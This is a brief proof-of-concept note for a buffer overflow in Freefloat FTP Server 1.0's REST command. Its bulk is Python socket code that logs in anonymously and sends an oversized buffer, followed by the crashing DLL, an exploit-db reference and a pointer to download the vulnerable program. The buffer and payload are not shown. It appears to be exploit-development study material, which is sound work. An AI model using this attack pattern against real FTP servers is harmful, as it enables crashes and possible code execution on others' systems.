# Buffer Overflow in Freefloat FTP Server 1.0 -'REST'

POC ==>
s.send("USER anonymous\r\n");
s.recv(1024);
s.send("PASS anonymous\r\n");
s.recv(1024);
s.send("REST " + buffer + "\r\n");
s.send("QUIT\r\n");

Vulnerable dll : ntdll.dll
ref : https://www.exploit-db.com/exploits/17546
Download vulnerable application from exploit-db page
